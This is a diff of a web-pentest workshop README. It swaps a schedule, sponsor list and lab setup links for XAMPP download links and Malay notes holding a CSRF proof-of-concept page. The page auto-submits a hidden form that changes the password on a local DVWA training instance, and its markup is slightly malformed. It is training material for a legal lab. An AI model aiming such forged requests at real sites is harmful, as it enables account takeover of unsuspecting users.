@@ -1,83 +1,32 @@
-# Update: Please clone this repository on 11.59 pm, 10 August 2022
+XAMPP FOR WINDOWS
+https://downloadsapachefriends.global.ssl.fastly.net/8.1.6/xampp-windows-x64-8.1.6-0-VS16-installer.exe?from_af=true
 
-![web-pentest-beginner-workshop](https://raw.githubusercontent.com/g3nj1z/web-pentest-beginner-workshop/main/Images/getctoposter.PNG)
+XAMPP FOR LINUX
+https://downloadsapachefriends.global.ssl.fastly.net/8.1.6/xampp-linux-x64-8.1.6-0-installer.run?from_af=true
 
-# Sponsored by:
-The following list is our main sponsors for this workshop
+XAMPP FOR OS X
+https://downloadsapachefriends.global.ssl.fastly.net/8.1.6/xampp-osx-8.1.6-0-vm.dmg?from_af=true
 
-## [Tarsoft.co](https://tarsoft.co/)
-![tarsoft](https://raw.githubusercontent.com/g3nj1z/web-pentest-beginner-workshop/main/Images/Tarsoft.png)
->
-Incepted in 2020, Tarsoft Sdn Bhd is a leading development & design expert company providing superior software, web, mobile and creative designing solutions and services to companies globally. Having a young and strong technology development and innovation center in Malaysia and with more than 50+ satisfied clients countrywide, raging from startups to across diverse industries.
+CSRF DVWA
+Nak tgk contoh script DVWA
+https://www.invicti.com/web-vulnerability-scanner/vulnerabilities/cross-site-request-forgery-in-login-form/
 
-Tarsoft Sdn Bhd is an HRDF approved centre for SBL scheme training and therefore all their certification trainings and workshops are HRDF claimable under the Skim Bantuan Latihan (SBL Scheme and SBL-Khas), subject to prior application to HRDF by the employers and PSMB’s approval. For training under the SBL-Khas Program, fees will be paid by PSMB to their training centre on behalf of employers based on claims we submit upon completion of training. No upfront payment is required. All of their training classes are HRDF claimable.
+Script Contoh CSRF Request Custom
+<html>
+    <body>
 
-## [Tenang Komuniti](https://rc.my/)
-![Tenang-Komuniti](https://rc.my/assets/img/logo.png)
->
-Tenang Komuniti Sdn Bhd is a company registered under the Companies Commission of Malaysia, Registration No: 202201000789 (1446486-W) where they lead the branding of PARC Academy.
+        <form action="http://localhost:8080/DVWA-master/DVWA-master/vulnerabilities/csrf/?" method="GET">
+            New password:<br />
+            <input type="hidden" AUTOCOMPLETE="off" name="password_new"> value=test123<br />
+            Confirm new password:<br />
+            <input type="hidden" AUTOCOMPLETE="off" name="password_conf"> value=test123<br />
+            <br />
+            <input type="hidden" value="Change" name="Change">
 
-# Workshop Tentative Schedule
-The following links is used as test project for the workshop.
-
-## Day 1
-
-| Time | Activity | Credit hour | Speaker |
-|--|--|--|--|
-| 09:00 - 09:15 | Workshop Registration | - | - |
-| 09:15 - 09:45 | Icebreaking Session | - | Irfan |
-| 09:45 - 10:00 | Introdution to Web App Pentesting | - | Naqib |
-| 10:00 - 11:30 | [SQL Injection (SQLi)](https://github.com/g3nj1z/web-pentest-beginner-workshop/blob/main/Test%20Projects/TestProject1.md) | 1.5 | Naqib |
-| 11:30 - 12:00 | [OS command injection](https://github.com/g3nj1z/web-pentest-beginner-workshop/blob/main/Test%20Projects/TestProject2.md) | 1.0 | Irfan |
-| 12:00 - 12:30 | [Information disclosure](https://github.com/g3nj1z/web-pentest-beginner-workshop/blob/main/Test%20Projects/TestProject3.md) | 0.5 | Irfan |
-| 12:30 - 14:00 | Lunch and networking, zuhr prayer | - | - |
-| 14:00 - 15:30 | [Cross-site-scripting (XSS)](https://github.com/g3nj1z/web-pentest-beginner-workshop/blob/main/Test%20Projects/TestProject4.md) | 1.5 | Naqib |
-| 15:30 - 16:00 | Tea break and networking session | - | - |
-| 16:00 - 16:30 | [Directory traversal](https://github.com/g3nj1z/web-pentest-beginner-workshop/blob/main/Test%20Projects/TestProject5.md) | 0.5 | Irfan |
-| 16:30 - 17:00 | Game Session | - | Amirul |
-| 17:00 - 17:30 | End of Day 1 | - | - |
-
-## Day 2
-
-| Time | Activity | Credit hour | Speaker |
-|--|--|--|--|
-| 09:00 - 10:30 | [Server side template injection (SSTI)](https://github.com/g3nj1z/web-pentest-beginner-workshop/blob/main/Test%20Projects/TestProject6.md) | 1.5 | Irfan |
-| 10:30 - 12:00 | [Cross-site request forgery (CSRF)](https://github.com/g3nj1z/web-pentest-beginner-workshop/blob/main/Test%20Projects/TestProject7.md) | 1.5 | Naqib |
-| 12:00 - 12:30 | Kahoot Session | - | Amirul |
-| 12:30 - 14:00 | Lunch and networking, zuhr prayer | - | - |
-| 14:00 - 14:30 | [Business logic vulnerability](https://github.com/g3nj1z/web-pentest-beginner-workshop/blob/main/Test%20Projects/TestProject8.md) | 0.5 | Irfan |
-| 14:30 - 15:30 | [File upload vulnerability](https://github.com/g3nj1z/web-pentest-beginner-workshop/blob/main/Test%20Projects/TestProject9.md) | 1.0 | Naqib |
-| 15:30 - 16:00 | Tea break and networking session | - | - |
-| 16:00 - 16:30 | [Access control vulnerability](https://github.com/g3nj1z/web-pentest-beginner-workshop/blob/main/Test%20Projects/TestProject10.md) | 0.5 | Irfan |
-| 16:30 - 17:00 | Closing Remark | - | - |
-| 17:00 - 17:30 | Workshop Completion | - | - |
-
-# What you will learn from this workshop?
-Penetration testing, also known as Pen Test, is the most common technique for testing the security of web applications. Web Application Penetration Testing involves simulating internal or external unauthorised attacks to gain access to sensitive data.
-
-With a two-day intensive workshop, we will go from "I don't even know how to install it" to actually understanding web application pentest. You will study and practise Web Pentest across multiple modules. Using Portswigger, bWapp and DVWA labs, we will conduct live pentests and provide step-by-step instruction.
-
-# Requirements
-The following are hardware and software recommendations:
-
-    - Linux / Windows / Mac Operating System
-    - Oracle VirtualBox / VMware Workstation (in a recent version)
-    - 25 GB of storage on your hard drive
-    - > 4 GB RAM
-
-We use three platform with all you need here:
-- [Portswigger Academy](https://portswigger.net/web-security) has very nice learning resources on their website. Basically, everything required to get started is there.
-
-- [bWAPP](https://sourceforge.net/projects/bwapp/files/bWAPP/), or a buggy web application, is a free and open source deliberately insecure web application. 
-
-- [DVWA](https://github.com/digininja/DVWA) is a PHP/MySQL web application, whose main goal is to be an aid for security professionals to test their skills and tools in a legal environment.
-
-# Setup
-The following are how to setup for our workshop labs
-- [Kali Linux](https://github.com/g3nj1z/web-pentest-beginner-workshop/blob/main/Setup/kalilinux.md)
-- [Portswigger Academy](https://github.com/g3nj1z/web-pentest-beginner-workshop/blob/main/Setup/portswiggeracademy.md)
-- [bWapp](https://github.com/g3nj1z/web-pentest-beginner-workshop/blob/main/Setup/bwapp.md)
-- [DVWA](https://github.com/g3nj1z/web-pentest-beginner-workshop/blob/main/Setup/dvwa.md)
-
-# Solutions
-In the case you are get stuck with a challenge, see the [solutions](https://github.com/g3nj1z/web-pentest-beginner-workshop/tree/main/Solutions) for hints
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
+ *Atau dekat bahagian burp suite, ada generate CSRF Poc.
